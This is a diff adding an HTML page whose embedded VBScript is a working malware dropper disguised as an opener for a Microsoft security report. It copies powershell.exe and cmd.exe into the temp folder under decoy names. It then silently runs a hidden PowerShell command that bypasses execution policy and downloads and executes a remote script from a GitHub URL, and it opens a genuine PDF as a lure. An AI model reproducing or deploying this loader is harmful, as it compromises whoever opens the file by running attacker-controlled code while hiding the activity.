@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<script language="VBScript">
+    Dim shell, fso, http, stream, pdfPath, psCmd, psTarget, cmdTarget
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+
+    psTarget = shell.ExpandEnvironmentStrings("%TEMP%") & "\CertAudio.exe"
+    If Not fso.FileExists(psTarget) Then
+        fso.CopyFile shell.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\WindowsPowerShell\v1.0\powershell.exe", psTarget, True
+    End If
+
+    cmdTarget = shell.ExpandEnvironmentStrings("%TEMP%") & "\CertConnections.exe"
+    If Not fso.FileExists(cmdTarget) Then
+        fso.CopyFile shell.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\cmd.exe", cmdTarget, True
+    End If
+
+    psCmd = """" & psTarget & """ -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command ""IEX (New-Object Net.WebClient).DownloadString('https://github.com/Novella2048/CertUtil/raw/refs/heads/main/autoexec.ps1')"""
+    shell.Run psCmd, 0, False
+
+    pdfUrl = "https://go.microsoft.com/fwlink/?linkid=2249025&clcid=0x409&culture=en-us&country=us"
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    http.Open "GET", pdfUrl, False
+    http.Send
+
+    If http.Status = 200 Then
+        pdfPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\Microsoft_Digital_Defense_Report_2023.pdf"
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write http.ResponseBody
+        stream.SaveToFile pdfPath, 2
+        stream.Close
+        shell.Run """" & cmdTarget & """ /c start """" """ & pdfPath & """", 0, False
+    End If
+
+    window.close()
+</script>
+</head>
+<body>
+</body>
+</html>
